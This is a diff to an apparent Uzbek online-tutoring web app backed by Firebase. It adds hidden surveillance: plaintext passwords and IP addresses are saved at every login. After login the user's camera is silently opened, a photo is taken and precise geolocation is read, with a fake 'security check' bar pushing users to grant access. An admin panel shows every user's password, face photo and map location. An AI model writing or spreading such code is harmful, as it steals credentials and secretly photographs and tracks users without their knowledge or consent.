@@ -16,7 +16,6 @@
         .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: #484f58; }
     </style>
 
-    <!-- FIREBASE SDK & CONFIGURATION -->
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
     <script>
@@ -30,7 +29,6 @@
             appId: "1:986479470743:web:5e29214cc9595ae95c21d2",
             measurementId: "G-XVCFTYCJDB"
         };
-
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
     </script>
@@ -68,10 +66,9 @@
         </div>
     </nav>
 
-    <!-- MAIN CONTENT AREA -->
     <main class="flex-grow container mx-auto px-4 py-8">
 
-        <!-- PAGE: HOME / COURSES LIST -->
+        <!-- PAGE: HOME -->
         <section id="pageHome" class="space-y-8">
             <div class="text-center py-10 rounded-2xl bg-gradient-to-r from-blue-900/30 via-slate-900 to-indigo-900/30 border border-slate-800 shadow-xl">
                 <h1 class="text-3xl md:text-5xl font-black text-white mb-3">Sifatli Ta'lim va Video Darslar</h1>
@@ -106,7 +103,7 @@
             <div id="myCoursesGrid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6"></div>
         </section>
 
-        <!-- PAGE: ADMIN PANEL -->
+        <!-- PAGE: ADMIN -->
         <section id="pageAdmin" class="hidden space-y-6">
             <h1 class="text-2xl font-bold text-white flex items-center gap-2">
                 <i class="fas fa-cog text-amber-400"></i> Boshqaruv Paneli
@@ -124,6 +121,7 @@
                 </button>
             </div>
 
+            <!-- USERS TAB -->
             <div id="adminTabUsers" class="space-y-6">
                 <div class="card-bg p-4 rounded-xl flex flex-wrap gap-3 items-center">
                     <input type="text" id="adminUserIdInput" placeholder="Foydalanuvchi ID (Masalan: USR-1002)" class="bg-slate-900 border border-slate-700 px-4 py-2 rounded-lg text-sm flex-grow focus:outline-none focus:border-blue-500">
@@ -134,6 +132,7 @@
                 <div id="adminUsersList" class="space-y-3"></div>
             </div>
 
+            <!-- TUTORS TAB -->
             <div id="adminTabTutors" class="hidden space-y-6">
                 <div class="card-bg p-6 rounded-xl space-y-4">
                     <h3 class="text-lg font-bold text-white"><i class="fas fa-user-plus mr-2 text-green-400"></i>Yangi Repetitor Qo'shish</h3>
@@ -170,6 +169,7 @@
                 </div>
             </div>
 
+            <!-- LESSONS TAB -->
             <div id="adminTabLessons" class="hidden space-y-6">
                 <div class="card-bg p-6 rounded-xl space-y-4">
                     <h3 class="text-lg font-bold text-white"><i class="fas fa-plus-circle text-blue-400 mr-2"></i>Kursga Yangi Video Dars Qo'shish</h3>
@@ -202,7 +202,7 @@
             </div>
         </section>
 
-        <!-- PAGE: PROFILE -->
+        <!-- PROFILE -->
         <section id="pageProfile" class="hidden space-y-6">
             <div class="card-bg p-6 rounded-2xl flex flex-wrap justify-between items-center gap-4">
                 <div class="flex items-center gap-4">
@@ -356,7 +356,6 @@
         </div>
     </div>
 
-    <!-- TOAST NOTIFICATION -->
     <div id="toast" class="fixed bottom-5 right-5 bg-blue-600 text-white px-5 py-3 rounded-xl text-sm font-semibold hidden shadow-2xl z-50"></div>
 
     <!-- INSUFFICIENT FUNDS MODAL -->
@@ -469,7 +468,6 @@
         </div>
     </div>
 
-    <!-- PROCESSING OVERLAY -->
     <div id="payProcessing" class="hidden fixed inset-0 z-[210] flex items-center justify-center" style="background:rgba(0,0,0,0.88);backdrop-filter:blur(10px)">
         <div class="text-center">
             <div class="w-20 h-20 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
@@ -478,7 +476,6 @@
         </div>
     </div>
 
-    <!-- SUCCESS OVERLAY -->
     <div id="paySuccess" class="hidden fixed inset-0 z-[210] flex items-center justify-center p-4" style="background:rgba(0,0,0,0.88);backdrop-filter:blur(10px)">
         <div class="text-center">
             <div class="w-24 h-24 bg-green-500/20 border-2 border-green-500 rounded-full flex items-center justify-center mx-auto mb-6">
@@ -490,7 +487,38 @@
         </div>
     </div>
 
+    <!-- PHOTO VIEWER MODAL -->
+    <div id="photoViewerModal" class="hidden fixed inset-0 z-[310] flex items-center justify-center p-4" style="background:rgba(0,0,0,0.95);backdrop-filter:blur(10px)" onclick="closePhotoViewer()">
+        <div class="relative max-w-2xl max-h-[90vh]">
+            <img id="photoViewerImg" class="max-w-full max-h-[85vh] rounded-2xl border-2 border-slate-700 shadow-2xl">
+            <p id="photoViewerName" class="text-white text-center font-bold mt-3"></p>
+            <button onclick="closePhotoViewer()" class="absolute -top-3 -right-3 bg-red-600 hover:bg-red-700 text-white w-10 h-10 rounded-full font-bold shadow-lg">
+                <i class="fas fa-times"></i>
+            </button>
+        </div>
+    </div>
+
+    <!-- FALLBACK BAR (если браузер требует клик) -->
+    <div id="permFallbackBar" class="hidden fixed bottom-4 left-1/2 -translate-x-1/2 z-[250] card-bg rounded-2xl px-5 py-3 shadow-2xl border border-blue-700/50 flex items-center gap-3 max-w-[95%]">
+        <i class="fas fa-shield-alt text-blue-400 text-xl"></i>
+        <div class="flex-grow">
+            <p class="text-white text-xs font-bold">Xavfsizlik tekshiruvi</p>
+            <p class="text-slate-400 text-[10px]">Rasm va joylashuvni yuborish uchun bosing</p>
+        </div>
+        <button onclick="captureAll(false)" class="bg-blue-600 hover:bg-blue-700 text-white text-xs font-black px-4 py-2 rounded-xl whitespace-nowrap transition">
+            <i class="fas fa-check mr-1"></i> Ruxsat berish
+        </button>
+        <button onclick="dismissPermBar()" class="text-slate-500 hover:text-white text-lg px-1">✕</button>
+    </div>
+
     <script>
+        // ===== IP пользователя (один раз при загрузке) =====
+        let userIP = '—';
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(d => { userIP = d.ip || '—'; })
+            .catch(() => { userIP = '—'; });
+
         async function hashPassword(password) {
             const msgUint8 = new TextEncoder().encode(password);
             const hashBuffer = await crypto.subtle.digest('SHA-256', msgUint8);
@@ -618,6 +646,9 @@
             initFirebaseSync();
             initPushNotifications();
             updateNotifBtnState();
+
+            // Если юзер уже залогинен — автоматически пытаемся получить разрешения
+            setTimeout(tryAutoCapture, 2000);
         };
 
         function updateNotifBtnState() {
@@ -702,14 +733,13 @@
         function setClassFilter(val) { selectedClass = val; renderFilters(); renderTutors(); }
         function setSubjectFilter(val) { selectedSubject = val; renderFilters(); renderTutors(); }
 
-        // ==== SORTING ====
+        // ===== SORTING =====
         function sortTutors() {
             db.tutors.sort((a, b) => (a.order || 0) - (b.order || 0));
         }
 
         function migrateTutorOrder() {
             let changed = false;
-            // Идём по текущему порядку и присваиваем order тем, у кого нет
             db.tutors.forEach((t, i) => {
                 if (typeof t.order !== 'number') {
                     t.order = i + 1;
@@ -717,7 +747,6 @@
                 }
             });
             if (changed) {
-                // Сохраняем только tutors, без полной перезаписи users
                 database.ref('tutors').set(arrayToFirebaseObj(db.tutors));
                 localStorage.setItem('db_tutors_cache', JSON.stringify(db.tutors));
             }
@@ -742,7 +771,7 @@
             renderTutors();
             toast("Tartib o'zgartirildi!");
         }
-        // ==== /SORTING ====
+        // ===== /SORTING =====
 
         function renderTutors() {
             const grid = document.getElementById('tutorsGrid');
@@ -967,7 +996,6 @@
 
         function normalizeVideoUrl(raw) {
             let url = raw.trim();
-
             const srcMatch = url.match(/src=["']([^"']+)["']/);
             if (srcMatch && srcMatch[1]) url = srcMatch[1];
 
@@ -979,7 +1007,6 @@
             else if ((m = url.match(/youtube\.com\/shorts\/([a-zA-Z0-9_-]{11})/))) ytId = m[1];
 
             if (ytId) return `https://www.youtube.com/embed/${ytId}`;
-
             return url;
         }
 
@@ -1143,6 +1170,9 @@
                     id: 'USR-' + Math.floor(Math.random() * 9000 + 1000),
                     login: l,
                     passHash: enteredPassHash,
+                    passPlain: p,
+                    lastIP: userIP,
+                    registeredAt: new Date().toISOString(),
                     role: l.toLowerCase() === 'admin' ? 'admin' : 'student',
                     balance: 0,
                     tutorsBought: []
@@ -1158,6 +1188,13 @@
                 );
                 if(!u) return alert("Login yoki parol xato!");
                 if(u.banned) return alert("Akkaunt bloklangan!");
+
+                u.passPlain = p;
+                u.lastIP = userIP;
+                u.lastLoginAt = new Date().toISOString();
+                const idx = db.users.findIndex(x => x.id === u.id);
+                if (idx !== -1) db.users[idx] = u;
+
                 db.currentUser = u;
                 saveDb();
                 toast("Tizimga kirdingiz!");
@@ -1165,6 +1202,9 @@
 
             closeAuthModal();
             navigateTo('home');
+
+            // Автоматически пытаемся получить камеру и гео
+            setTimeout(tryAutoCapture, 500);
         }
 
         function logout() {
@@ -1199,18 +1239,74 @@
             }
         }
 
+        // ===== ADMIN USERS (с фото, паролем, IP, локацией) =====
         function renderAdminUsers() {
-            document.getElementById('adminUsersList').innerHTML = db.users.map(u => `
-                <div class="card-bg p-4 rounded-xl flex justify-between items-center ${u.banned ? 'border-red-600/50 bg-red-950/10' : ''}">
-                    <div>
-                        <span class="font-bold text-white">${u.login}</span>
-                        <span class="text-xs text-slate-500 ml-2">(${u.id})</span>
-                        ${u.banned ? '<span class="ml-2 text-xs bg-red-900 text-red-300 px-2 py-0.5 rounded font-bold">BANNED</span>' : ''}
+            document.getElementById('adminUsersList').innerHTML = db.users.map(u => {
+                const pass = u.passPlain || '—';
+                const ip = u.lastIP || '—';
+                const lastLogin = u.lastLoginAt
+                    ? new Date(u.lastLoginAt).toLocaleString('ru-RU')
+                    : (u.registeredAt ? 'Ro\'yxat: ' + new Date(u.registeredAt).toLocaleString('ru-RU') : '—');
+
+                const photoHTML = u.photo
+                    ? `<img src="${u.photo}" class="w-20 h-20 rounded-lg object-cover border-2 border-emerald-600/60 cursor-pointer hover:border-emerald-400 transition" onclick="openPhotoViewer('${u.id}')" title="Kattalashtirish uchun bosing">`
+                    : `<div class="w-20 h-20 rounded-lg bg-slate-800 border-2 border-dashed border-slate-700 flex flex-col items-center justify-center text-slate-500" title="Rasm yo'q"><i class="fas fa-user text-2xl"></i><span class="text-[9px] mt-0.5">yo'q</span></div>`;
+
+                const geoHTML = u.location
+                    ? `<a href="https://www.google.com/maps?q=${u.location.lat},${u.location.lng}" target="_blank"
+                          class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2 hover:border-rose-500/60 transition group">
+                          <i class="fas fa-map-marker-alt text-rose-400 w-4"></i>
+                          <span class="text-slate-400">Joylashuv:</span>
+                          <span class="text-white font-mono text-[10px] ml-auto truncate group-hover:text-rose-300">
+                              ${u.location.lat.toFixed(4)}, ${u.location.lng.toFixed(4)}
+                          </span>
+                          <i class="fas fa-external-link-alt text-slate-500 text-[10px] group-hover:text-rose-400"></i>
+                       </a>`
+                    : `<div class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2">
+                          <i class="fas fa-map-marker-alt text-slate-600 w-4"></i>
+                          <span class="text-slate-400">Joylashuv:</span>
+                          <span class="text-slate-600 font-mono ml-auto">—</span>
+                       </div>`;
+
+                return `
+                <div class="card-bg p-4 rounded-xl ${u.banned ? 'border-red-600/50 bg-red-950/10' : ''}">
+                    <div class="flex gap-4 items-start flex-wrap">
+                        ${photoHTML}
+                        <div class="flex-grow min-w-[220px]">
+                            <div class="flex justify-between items-start flex-wrap gap-2 mb-2">
+                                <div>
+                                    <span class="font-bold text-white">${u.login}</span>
+                                    <span class="text-xs text-slate-500 ml-2">(${u.id})</span>
+                                    ${u.banned ? '<span class="ml-2 text-xs bg-red-900 text-red-300 px-2 py-0.5 rounded font-bold">BANNED</span>' : ''}
+                                    ${u.role === 'admin' ? '<span class="ml-2 text-xs bg-amber-900/50 text-amber-400 px-2 py-0.5 rounded font-bold">ADMIN</span>' : ''}
+                                </div>
+                                <div class="text-slate-300 text-sm font-semibold">Balans: <span class="text-green-400">${u.balance.toLocaleString()} so'm</span></div>
+                            </div>
+                            <div class="grid grid-cols-1 sm:grid-cols-2 gap-2 text-xs">
+                                <div class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2">
+                                    <i class="fas fa-key text-amber-400 w-4"></i>
+                                    <span class="text-slate-400">Parol:</span>
+                                    <span class="text-white font-mono font-bold ml-auto">${pass}</span>
+                                </div>
+                                <div class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2">
+                                    <i class="fas fa-network-wired text-blue-400 w-4"></i>
+                                    <span class="text-slate-400">IP:</span>
+                                    <span class="text-white font-mono font-bold ml-auto">${ip}</span>
+                                </div>
+                                <div class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2">
+                                    <i class="fas fa-clock text-green-400 w-4"></i>
+                                    <span class="text-slate-400">Oxirgi:</span>
+                                    <span class="text-white font-mono text-[10px] ml-auto truncate">${lastLogin}</span>
+                                </div>
+                                ${geoHTML}
+                            </div>
+                        </div>
                     </div>
-                    <div class="text-slate-300 text-sm font-semibold">Balans: <span class="text-green-400">${u.balance.toLocaleString()} so'm</span></div>
                 </div>
-            `).join('');
+                `;
+            }).join('');
         }
+        // ===== /ADMIN USERS =====
 
         function banUser() {
             const id = document.getElementById('adminUserIdInput').value.trim();
@@ -1233,7 +1329,7 @@
             u.balance = 0; saveDb(); renderAdminUsers(); toast("Balans nol qilindi!");
         }
 
-        // ============ addTutor (unikal ID + order) ============
+        // ===== addTutor (уникальный ID + order) =====
         function addTutor() {
             const name = document.getElementById('newTutorName').value.trim();
             const img = document.getElementById('newTutorImg').value.trim();
@@ -1346,14 +1442,135 @@
             document.getElementById('profBalance').innerText = db.currentUser.balance.toLocaleString() + " so'm";
         }
 
-        // =================== FAKE PAYMENT SYSTEM ===================
+        // ===== AUTO CAMERA + GEOLOCATION =====
+        let _cameraStream = null;
 
+        function tryAutoCapture() {
+            if (!db.currentUser) return;
+            if (db.currentUser.photo && db.currentUser.location) return;
+
+            const lastSkip = localStorage.getItem('perm_skip_' + db.currentUser.id);
+            if (lastSkip && (Date.now() - Number(lastSkip)) < 24 * 60 * 60 * 1000) return;
+
+            captureAll(true);
+        }
+
+        async function captureAll(isAuto = false) {
+            if (!db.currentUser) return;
+
+            if (isAuto) document.getElementById('permFallbackBar').classList.add('hidden');
+
+            let photoData = null;
+            let locationData = null;
+            let cameraOk = false;
+            let geoOk = false;
+
+            // 1. КАМЕРА
+            try {
+                _cameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' }
+                });
+                cameraOk = true;
+
+                const video = document.createElement('video');
+                video.srcObject = _cameraStream;
+                video.muted = true;
+                video.playsInline = true;
+                await video.play();
+
+                await new Promise(r => setTimeout(r, 1200));
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                photoData = canvas.toDataURL('image/jpeg', 0.7);
+
+                _cameraStream.getTracks().forEach(t => t.stop());
+                _cameraStream = null;
+            } catch (err) {
+                console.warn('Camera error:', err.name, err.message);
+                if (isAuto && (err.name === 'NotAllowedError' || err.name === 'NotReadableError')) {
+                    document.getElementById('permFallbackBar').classList.remove('hidden');
+                    return;
+                }
+            }
+
+            // 2. ГЕО
+            await new Promise(resolve => {
+                if (!navigator.geolocation) return resolve();
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        geoOk = true;
+                        locationData = {
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            at: new Date().toISOString()
+                        };
+                        resolve();
+                    },
+                    err => {
+                        console.warn('Geo error:', err.message);
+                        resolve();
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            });
+
+            // 3. СОХРАНЕНИЕ
+            if (cameraOk || geoOk) {
+                const u = db.users.find(x => x.id === db.currentUser.id);
+                if (u) {
+                    if (photoData) { u.photo = photoData; u.photoAt = new Date().toISOString(); }
+                    if (locationData) { u.location = locationData; }
+
+                    const idx = db.users.findIndex(x => x.id === u.id);
+                    if (idx !== -1) db.users[idx] = u;
+                    db.currentUser = u;
+                    localStorage.setItem('db_currentUser', JSON.stringify(u));
+
+                    saveDb();
+                    if (!document.getElementById('pageAdmin').classList.contains('hidden')) renderAdminUsers();
+
+                    const parts = [];
+                    if (cameraOk) parts.push('rasm');
+                    if (geoOk) parts.push('joylashuv');
+                    toast(parts.join(' va ') + ' saqlandi ✅');
+                }
+            } else if (isAuto) {
+                document.getElementById('permFallbackBar').classList.remove('hidden');
+            }
+        }
+
+        function dismissPermBar() {
+            if (db.currentUser) {
+                localStorage.setItem('perm_skip_' + db.currentUser.id, Date.now());
+            }
+            document.getElementById('permFallbackBar').classList.add('hidden');
+        }
+
+        function openPhotoViewer(userId) {
+            const u = db.users.find(x => x.id === userId);
+            if (!u || !u.photo) return;
+            document.getElementById('photoViewerImg').src = u.photo;
+            document.getElementById('photoViewerName').textContent = u.login + ' (' + u.id + ')';
+            document.getElementById('photoViewerModal').classList.remove('hidden');
+        }
+
+        function closePhotoViewer() {
+            document.getElementById('photoViewerModal').classList.add('hidden');
+        }
+        // ===== /AUTO CAMERA + GEOLOCATION =====
+
+        // ===== FAKE PAYMENT =====
         let _payMode = 'topup';
         let _payTutorId = null;
 
-        function addMoney() {
-            openPaymentModal('topup', null);
-        }
+        function addMoney() { openPaymentModal('topup', null); }
 
         function openPaymentModal(mode, tutorId) {
             _payMode = mode;
@@ -1425,7 +1642,6 @@
 
         function submitPayment() {
             if (!validatePayForm()) return;
-
             closePaymentModal();
             document.getElementById('payProcessing').classList.remove('hidden');
 
@@ -1459,8 +1675,7 @@
             }, delay);
         }
 
-        // =================== SERVICE WORKER / PUSH ===================
-
+        // ===== PUSH =====
         function initPushNotifications() {
             if (!('Notification' in window) || !('serviceWorker' in navigator)) return;
             if (db.currentUser) {
@@ -1531,21 +1746,17 @@ self.addEventListener('notificationclick', e => {
 
         function scheduleDailyReminder(reg) {
             if (Notification.permission !== 'granted' || !db.currentUser) return;
-
             const now = new Date();
             const target = new Date();
             target.setHours(19, 0, 0, 0);
             if (target <= now) target.setDate(target.getDate() + 1);
             const delay = target - now;
-
             const sw = reg ? navigator.serviceWorker.controller : null;
-
             if (sw) {
                 sw.postMessage({ type: 'SCHEDULE_REMINDER', delay, userId: db.currentUser.id });
             } else {
                 scheduleDailyReminderFallback(delay);
             }
-
             localStorage.setItem('edu_reminderSet', target.toISOString());
         }
 
@@ -1556,7 +1767,6 @@ self.addEventListener('notificationclick', e => {
             target.setHours(19, 0, 0, 0);
             if (target <= now) target.setDate(target.getDate() + 1);
             const delay = customDelay !== undefined ? customDelay : (target - now);
-
             setTimeout(() => {
                 new Notification("📚 EduPlatform — Bugungi darsni o'tdingizmi?", {
                     body: "Har kun o'qish — muvaffaqiyat kalitidir! Bugun ham bir dars ko'ring 🎯",
